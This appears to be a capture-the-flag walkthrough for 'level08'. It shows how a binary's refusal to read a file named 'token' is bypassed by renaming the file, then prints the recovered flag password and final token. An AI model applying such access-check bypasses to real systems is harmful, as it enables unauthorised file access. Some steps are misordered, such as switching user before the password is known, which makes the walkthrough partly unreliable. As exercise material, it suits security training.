# level08 solve

To begin, when we get logged and trying to see if we got the file we can see we have two files

```
$ ls
> level08
> token
```
Firstly we try to launch the binary

```
$ ./level08
> ./level08 [file to read]
```

Retry with the token

```
$ ./level08 token
> You may not access 'token'
```

Doesn't work, but we just need to have access to the token

```
$ mv token file
```

Retry the binary

```
$ su flag08
$ ./level08 file
> quif5eloekouj29ke0vouxean
```

We got the flag! Try to log on the user flag08 with the password

```
$ su flag08
$ quif5eloekouj29ke0vouxean
> Don't forget to launch getflag!
$ getflag
> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

We got it!

> <a href="../flag">flag</a> - <a href="../../level07">previous level</a> - <a href="../../level09">next level</a>
